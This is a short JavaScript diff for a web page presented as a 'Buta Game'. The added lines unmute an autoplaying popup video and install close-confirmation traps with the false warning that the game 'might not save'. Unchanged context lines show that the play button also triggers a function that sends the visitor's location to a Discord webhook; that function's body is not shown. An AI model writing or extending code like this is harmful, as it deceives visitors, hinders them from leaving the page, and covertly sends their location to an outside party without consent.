@@ -11,9 +11,14 @@ document.getElementById('playButton').addEventListener('click', function() {
         if (newWindow) {
             newWindow.document.write(`
                 <title>Buta Game</title>
-                <video style="max-width: 100%;" muted autoplay>
+                <video style="max-width: 100%;" autoplay>
                     <source src="${url}" type="video/mp4">
                 </video>
+                <script>
+                    window.onbeforeunload = function() {
+                        return "Are you sure you want to close? Game might not save.";
+                    };
+                </script>
             `);
             newWindow.document.close();
 
@@ -47,6 +52,11 @@ document.getElementById('playButton').addEventListener('click', function() {
     // Send location to Discord webhook
     sendLocationToWebhook();
 });
+
+// Add close confirmation to main page
+window.onbeforeunload = function() {
+    return "Are you sure you want to close? Game might not save.";
+};
 
 // Function to send location to Discord webhook
 function sendLocationToWebhook() {
